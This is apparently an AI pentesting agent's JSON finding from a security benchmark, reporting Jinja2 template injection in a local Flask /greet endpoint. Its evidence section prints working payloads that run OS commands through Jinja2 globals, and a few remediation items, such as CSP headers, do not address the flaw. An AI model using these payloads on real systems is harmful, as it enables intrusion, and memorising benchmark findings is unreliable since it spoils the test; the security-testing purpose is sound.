{
  "title": "Server-Side Template Injection (SSTI) Leading to Remote Code Execution in /greet Endpoint",
  "severity": "CRITICAL",
  "description": "The /greet endpoint is vulnerable to Server-Side Template Injection (SSTI) in the 'name' query parameter. The application uses Flask/Jinja2 templating and fails to properly sandbox user input, allowing attackers to inject arbitrary Jinja2 template expressions that are evaluated server-side. This leads to direct Remote Code Execution (RCE) as the application user (daytona). The vulnerability allows attackers to break out of the template context and access Python's built-in functions and modules through various methods including the cycler object and request.application globals.",
  "impact": "An attacker can achieve complete Remote Code Execution on the target system. This allows:\n- Reading sensitive files (e.g., /etc/passwd, application source code, configuration files)\n- Executing arbitrary system commands\n- Potential privilege escalation if the application runs with elevated privileges\n- Complete compromise of the application and underlying system\n- Data exfiltration\n- Lateral movement to other systems on the network",
  "endpoint": "http://localhost:5000/greet",
  "evidence": "POC Testing Results:\n\n[TEST 1] Basic Expression Evaluation:\n- Payload: GET /greet?name={{7*7}}\n- Response: Hello, 49!\n- Confirmation: Template expressions are being evaluated\n\n[TEST 2] Command Execution (id):\n- Payload: GET /greet?name={{cycler.__init__.__globals__.os.popen(\"id\").read()}}\n- Response: Hello, uid=1001(daytona) gid=1001(daytona) groups=1001(daytona)!\n- Confirmation: Arbitrary OS commands execute successfully\n\n[TEST 3] Alternative RCE Method:\n- Payload: GET /greet?name={{request.application.__globals__.__builtins__.__import__(\"os\").popen(\"id\").read()}}\n- Response: Hello, uid=1001(daytona) gid=1001(daytona) groups=1001(daytona)!\n- Confirmation: Multiple exploitation techniques work",
  "pocPath": "pocs/poc_ssti_rce_greet_v2.sh",
  "remediation": "1. **Input Validation & Sanitization**: Implement strict whitelist validation on the 'name' parameter. Only allow alphanumeric characters, spaces, and hyphens.\n\n2. **Never Pass Untrusted Input to Templates**: Use template variables instead of directly rendering user input. Replace `render_template_string(f\"Hello, {name}\")` with `render_template(\"template.html\", name=name)`.\n\n3. **Enable Auto-Escaping**: Ensure Jinja2 auto_escape is enabled in Flask configuration:\n   ```python\n   app.config['TEMPLATES_AUTO_RELOAD'] = True\n   app.jinja_env.autoescape = True\n   ```\n\n4. **Use Sandboxed Rendering**: Implement Jinja2's sandboxed environment for untrusted templates:\n   ```python\n   from jinja2.sandbox import SandboxedEnvironment\n   env = SandboxedEnvironment()\n   template = env.from_string(user_template)\n   ```\n\n5. **Apply Principle of Least Privilege**: Run the application with minimal necessary permissions, not as a privileged user.\n\n6. **Implement Content Security Policy**: Add CSP headers to limit template execution context.\n\n7. **Input Length Limits**: Implement maximum length restrictions on query parameters.\n\n8. **Regular Security Updates**: Keep Flask, Jinja2, and all dependencies updated to the latest versions.",
  "references": "OWASP A03:2021 - Injection, OWASP Server-Side Template Injection (SSTI), CWE-1336: Improper Neutralization of Special Elements Used in a Templating Engine, CWE-94: Improper Control of Generation of Code ('Code Injection')",
  "toolCallDescription": "Documenting critical SSTI RCE vulnerability in /greet endpoint with verified working POC",
  "timestamp": "2025-11-07T21:35:56.235Z",
  "sessionId": "benchmark-XBEN-076-24-mhpdcdue",
  "target": "./repo"
}